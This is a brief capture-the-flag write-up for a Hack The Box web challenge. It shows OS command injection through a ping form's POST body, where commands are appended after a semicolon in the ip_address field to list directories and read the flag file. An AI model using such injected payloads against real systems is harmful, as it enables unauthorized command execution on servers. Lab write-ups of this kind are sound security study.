# HTB Looking Glass
Description: We've built the most secure networking tool in the market, come and check it out!

# Initial Ideas
Spawned instance is named "rce" in the browser tab. Likely some sort of simple remote code execution

# Page Source
We see that a POST method is being used. Nothing else of significance

![Web Source](webimage.png)

# Inspect
Since Looking Glass is using a POST method, we can observe the network monitor in the browser. This is an easy challenge, so we shouldn't need to use much else.

## Request Body
Navigating to the **Headers** section, we see the request body contains `test=ping&ip_address=167.99.84.37&submit=Test`. These are simply Linux/Unix commands being sent over the API, so we could try editing them.

![Request Body](request_body.png)

### PoC
Command injection via a web request can be added by inserting a semicolon followed by the command itself. For example, `test=ping&ip_address=167.99.84.37;pwd&submit=Test` returns:

![PoC Image](PoC.png)

### Finding the Flag
Using the same stucture, we can list all the files in the top directory:
`test=ping&ip_address=167.99.84.37;ls ../&submit=Test`

![Found the Flag](found_the_flag_.png)

### Read Flag
`test=ping&ip_address=167.99.84.37;cat ../flag_MF7Nb&submit=Test`

![Flag](flag.jpg)

